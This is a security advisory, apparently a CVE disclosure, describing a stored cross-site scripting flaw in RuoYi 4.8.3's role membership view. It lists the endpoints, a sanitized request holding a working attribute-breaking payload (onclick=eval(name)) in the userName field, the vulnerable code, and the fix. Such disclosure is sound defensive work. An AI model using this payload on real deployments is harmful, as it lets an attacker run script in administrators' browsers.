# RuoYi profile userName attribute stored XSS

## Summary

RuoYi 4.8.3 contains stored cross-site scripting in the role user-view page. Any authenticated user can update their own userName; the role view formatter later concatenates that value into a data-search HTML attribute without attribute encoding. A crafted display name executes script when a privileged user views role membership details.

## Affected product

- Vendor/project: **yangzongzhuan**
- Product: **RuoYi**
- Affected version: **4.8.3**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated attacker; victim can view role membership details.

Verified flow: `self-service userName → role user list JSON → searchKey → data-search attribute`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Update the attacker's own display name with a quote-breaking attribute payload.
2. Confirm the exact value is stored and returned by the role user-list endpoint.
3. Open the role membership view and interact with the crafted user card.

Sanitized request shape used during verification:

```http
# Any authenticated user updates their own profile
POST <BASE_URL>/system/user/profile/update
Cookie: <SESSION_COOKIE>
Content-Type: application/x-www-form-urlencoded

userName=gt481022%22%20onclick%20%3D%20eval%28name%29
sex=0
email=gt481022ry43@example.test
phonenumber=<BENIGN_VALUE>

# A role viewer loads the stored user record
POST <BASE_URL>/system/role/authUser/allocatedList
Cookie: <PRIVILEGED_SESSION_COOKIE>

roleId=1&pageNum=1&pageSize=50
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481022 + ry41` | code=0; exact userName returned | **PASS** |
| 2 | `gt481022 + ry42` | code=0; exact userName returned | **PASS** |
| 3 | `gt481022 + ry43` | code=0; exact userName returned | **PASS** |

```text
Saved allocatedList JSON, run 3:
{
  "total": 1,
  "code": 0,
  "userName": "gt481022\" onclick = eval(name)",
  "email": "gt481022ry43@example.test"
}

Fresh run captured storage/response evidence. The vulnerable formatter below
deterministically places the quote-breaking value into data-search.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
role/view.html:593-596
var searchKey = [u.userName || '', u.loginName || '', u.phonenumber || '']
    .join('|').toLowerCase();
var card = [
    '<div class="user-card" data-search="' + searchKey + '">',
    ...
].join('');
```

Root cause: A self-service profile field is copied into searchKey and concatenated into a double-quoted data-search attribute. Quotes are not attribute-encoded.

## Recommended remediation

Build the card with DOM APIs and set dataset.search, or apply HTML attribute encoding to every value before interpolation.

## References

- Official source: https://github.com/yangzongzhuan/RuoYi/blob/master/ruoyi-admin/src/main/resources/templates/system/role/view.html

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-11 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-11/01-reproduction-v2.png)

### Three-run success proof

![CAN-11 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-11/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-11 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-11/03-source-sink-v2.png)
